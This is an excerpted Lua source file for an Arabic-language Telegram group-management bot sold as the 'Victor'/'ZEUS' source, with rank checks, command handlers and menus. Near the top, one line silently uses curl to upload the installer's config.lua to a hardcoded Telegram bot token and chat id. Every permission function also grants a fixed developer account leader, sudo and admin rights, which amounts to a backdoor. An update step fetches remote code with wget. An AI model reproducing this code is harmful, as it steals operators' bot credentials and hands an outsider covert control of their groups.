...
-- All The File  By Developer Victor  : @oo_oof 
-- Join In Chennel Source : @oo_oof 
-- Join In Explanation Channel : @kgtpulse
----------------------------------------------------------------------------
...
local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 1463960994 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
...
name_bot = (faederdx1:get(FAEDER..'name_bot') or 'فيكتور')
...
--      By Developer ZEUS      -- 
-------- Bot Owner
function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(1463960994) then var = true end return var end
function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
-------- Sudo
function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(1463960994) then var = true end return var end
function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
-------- Sudo3
function is_admin(user_id) local var = false local hashsb =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsb, user_id) if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
-------- Owner all
function is_onall(user_id) local var = false local hash =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if onall then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
--------Modod all
function is_moall(user_id) local var = false local hash =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) if moall then var = true end if admin then var = true end if onall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
-------- Vip Member All
function is_vpall(user_id) local var = false local hashs =  'bot:vpall:' local vpall = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:moall:'local moall = faederdx1:sismember(FAEDER..hashssss, user_id) if vpall then var = true end if onall then var = true end if admin then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
-------- Donky
function is_donky(user_id, chat_id) local var = false local hash =  'bot:donky:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) if donky then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
-------- Monsh
function is_monsh(user_id, chat_id) local var = false local hash =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if monsh then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
-------- Monsh2
function is_monsh2(user_id, chat_id) local var = false local hash =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) if monsh2 then var = true end if admin then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
-------- Owner
function is_owner(user_id, chat_id) local var = false local hash =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if owner then var = true end if admin then var = true end if monsh then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
-------- Modod
function is_momod(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashssss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
-------- Vip Member
function is_vipmem(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if vipmem then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1463960994) then var = true end return var end
----------------------------------------------------------
--      By Developer ZEUS      -- 
...
local UserName = (data.username_ or "ZEUS")
...
faederdx113(chat,msg.id_,"*߷ هذا الملف ليس تابع لسورس زيوس ،*")   
return false 
end      
...
if tonumber(msg.sender_user_id_) == tonumber(1607652235) then
faeder  = "مالك السورس"
...
if tonumber(user_id) == tonumber(1607652235) then
faeder  = "مالك السورس"
...
faederdx(msg.chat_id_, msg.id_, 1, "߷ لا يوجد هذا الامر ،", 1, 'html')
end
...
--      By Developer ZEUS        -- 
if text == "߷ قائمه الاوامر ߷" and faeder11(msg) then
...
--      By Developer Victor      -- 
if text == "حذف قائمه الاوامر" or text == "مسح قائمه الاوامر" and faeder11(msg) then
local list = faederdx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
...
faederdx(msg.chat_id_, msg.id_, 1, "߷ ارسل لي الامر الذي قمت باضافته .", 1, 'html')
return false 
end
--      By Developer ZEUS        -- 
...
faederdx(msg.chat_id_, msg.id_, 1, '߷ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'ZEUSX')..')'..' )\n߷ *تم رفعه ( '..faederrt..' )\n߷ *بواسطه ( '..renk_faeder(msg)..' )*\n*', 1, 'md')
...
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '߷ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'ZEUSX')..')'..' )\n߷ تم رفعه ( '..text1[2]..' )\n߷ بواسطه ( '..renk_faeder(msg)..' )\n', 1, 'md')
...
local inline = {{{text="المطور",url="t.me/"..(SudoFaeder or "KGTBM")}}}
local Sudo_Welcome = '߷ يمكنك ايضا استخدام الاوامر الخدميه \n߷ اليك ازرار الاوامر الخدميه اسفل الرساله\n                  • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n                              [𝑮𝑶𝑶𝑮𝑳𝑬 𖡛 ](https://t.me/KGTBM)'
local key = {
{'زخرفه','احسب عمرك'},
{'الابراج','نسبه الحب'},
{'قسم الحمايه'},
...
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_ids, -- ZEUSX
disable_notification_ = disable_notification,
from_background_ = 1
}, dl_cb, nil)
end
...
keyboard = {} -- الحقوق محفوظه سورس ZEUS بدون ذكر المصدر
...
local text = text:gsub('user',(result.username_ or 'KGTBM'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
...
local text = text:gsub('username',(result.username_ or 'KGTBM'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
...
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..FAEDER..'.json', '߷ عدد مجموعات البوت : '..#list..'',dl_cb, nil)
end
--      By Developer ZEUS       -- 
...
--      By Developer ZEUS      -- 
if text == 'زياد' or text == 'زوز' or text == 'زيوس' then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then local faeder = { "[父 مطور جميع السورسات](t.me/oo_oof)"}  faederdx12 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faederdx12] , 1, 'md') end end
--      By Developer ZEUS      -- 
...
faeder0 = '父 ليس لديك نقاط العب اولا ، \n父 للعب ارسل { الالعاب } .'
...
--      By Developer ZEUS      -- 
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "ابعتلي بوت الهمسه" or  text and text == "ابعتلو بوت الهمسه" and faeder11(msg) then  
faederdx(msg.chat_id_, msg.id_, 1, '߷ يمكنك من خلال هذا البوت\n߷ ارسال همسه سريه للاعضاء \n߷ الامر كالاتي مثال : اهمس هلو [@OO_OOF]', 1, 'md')
end
if text and text:match("/start hms(.*)_(%d+)") then 
...
faederdx(msg.chat_id_, msg.id_, 1, '߷ الهمسه مش ليك،', 1, 'md')
end else 
faederdx(msg.chat_id_, msg.id_, 1, '߷ الهمسه مش ليك ،', 1, 'md')
end end
--      By Developer ZEUS      -- 
...
faederdx(msg.chat_id_, msg.id_, 1, '߷ شغال وصلاحياته هي ⬇️\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n߷ حذف الرسائل ، '..DEL..'\n߷ دعوة المستخدمين ، '..INV..'\n߷ حظر المستخدمين ، '..BAN..'\n߷ تثبيت الرسائل ، '..PIN..'\n߷ تغيير المعلومات ، '..EDT..'\n߷ اضافة مشرفين ، '..VIP..'\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n߷ قناة السورس ، [@OO_OOF]', 1, 'md')
end end end
--      By Developer ZEUS      -- 
 if is_admin(msg.sender_user_id_, msg.chat_id_) then
name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'فيكتور')
...
if Faeder == 'yes' then
if text:match("^برونز (%d+)$") or text:match("^جولد (%d+)$") or text:match("^بلاتينيوم (%d+)$") or text:match("^دايموند (%d+)$") or text:match("^كراون (%d+)$") or text:match("^ايس$") or text:match("^كونكر$") then
...
if tonumber(result.id_) == tonumber(1607652235) then
t = ' مالك السورس' 
...
if result.id_ then 
if tonumber(result.sender_user_id_) == tonumber(1607652235) then
faeder1 = 'مالك السورس '
...
{text="- فيكتور الغدار،",url="t.me/KGTBR"}},
{{text="- اضغط هنا لتنصيب السورس ،",url="t.me/KGTBM"}},
{{text="- كروب المبرمجين ،",url="https://t.me/kgt_8"},
{text="- شروحات السورس ،",url="t.me/kgtpulse"}}
}
send_inline(msg.chat_id_,'✦┋مرحبا بك في سورس فيكتور┋ZEUS ،\n✦┋اضغط على الازرار بالاسفل ⬇️ ،',nil,inline) 
return false 
end
--      By Developer Victor      -- 
...
local username = text:match('طور رتبه ثالثه @(.*)')
...
return false  end
if res.id_ then  
if tonumber(res.id_) == tonumber(1463960994) then
t = 'فيكتور الغدار  '
...
if tonumber(iduser) == tonumber(1463960994) then
t = 'فيكتور الغدار  '
...
if tonumber(msg.sender_user_id_) == tonumber(1463960994) then
renk_forid  = "فيكتور الغدار"
elseif is_leaderid(msg.sender_user_id_) then
...
faederdx1:set(FAEDER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@KGTBM")) 
faederdx(msg.chat_id_, msg.id_, 1, "✦┋المنشئ ⌯» ["..monsh.."]\n\n✦┋الرابط ، ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/KGTBM")..")\n✦┋ايديها ⌯» *"..msg.chat_id_.."*\n✦┋عدد الاعضاء ⌯» *"..data.member_count_.."* \n✦┋عدد المدراء ⌯» *"..Owner.."*\n✦┋عدد المنشئين ⌯» *"..Monsh.."*\n✦┋عدد الادمنيه ⌯» *"..Momod.."*\n✦┋عدد المكتومين ⌯» *"..Muted.."*\n✦┋عدد المحظورين ⌯» *"..Baned.."*\n✦┋عدد المقيدين ⌯» *"..Tkeed.."*\n✦┋عدد المميزين ⌯» *"..Vip.."*\n", 1,"md")
end
tdcli_function ({
ID = "GetChannelFull",
...
local list = faederdx1:smembers(FAEDER.."bot:groups")
local text = "~ Groups_Bots_In_the_Bot_Of_Source_Faeder ~ @KGTBM\n\n"
for k,v in pairs(list) do
...
os.execute('wget https://raw.githubusercontent.com/kgtt/Victor/master/FAEDER.lua') 
...
-------------------------******* The Best Source *******-------------------------
-- END VERSION (22) Victor DX 
-- All The File  By Developer Victor  : @ZU_XU
-- Join In Chennel Source : @OO_OOF 
-- Join In Explanation Channel : @OO_OOF